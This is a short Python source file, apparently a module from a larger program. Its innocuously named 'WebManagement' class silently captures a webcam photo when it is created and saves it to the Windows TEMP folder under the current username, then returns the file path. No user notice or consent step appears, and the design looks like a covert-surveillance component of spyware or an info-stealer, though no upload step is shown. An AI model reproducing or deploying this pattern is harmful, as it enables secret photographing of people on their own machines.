from .imports import *

class WebManagement:
    def __init__(self) -> None:
        temp = os.getenv("TEMP")
        if os.path.exists(temp + f"\\{os.getlogin()}-webcam.png"):
            os.remove(temp + f"\\{os.getlogin()}-webcam.png")
        with open(temp + f"\\{os.getlogin()}-webcam.png", "a")as d:
            pass
        cp = 0
        camera = cv2.VideoCapture(cp)
        returned_value, image = camera.read()
        cv2.imwrite(temp + f"\\{os.getlogin()}-webcam.png", image)
        del(camera)
        
    def __repr__(self) -> str:
        return "WebManagement()"
        
    def Val(self) -> str:
        temp = os.getenv("TEMP")
        return temp + f"\\{os.getlogin()}-webcam.png"